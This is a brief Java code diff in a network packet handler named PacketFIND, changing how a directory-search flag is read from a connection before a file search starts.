@@ -15,7 +15,7 @@ public class PacketFIND extends AbstractPacket {
 			start = start + File.separator;
 		}
 		String what = Connection.readLine();
-		boolean dir = Boolean.parseBoolean(Connection.readLine());
+		boolean dir = Connection.readBoolean();
 		new Search(start, what, dir).start();
 	}
 
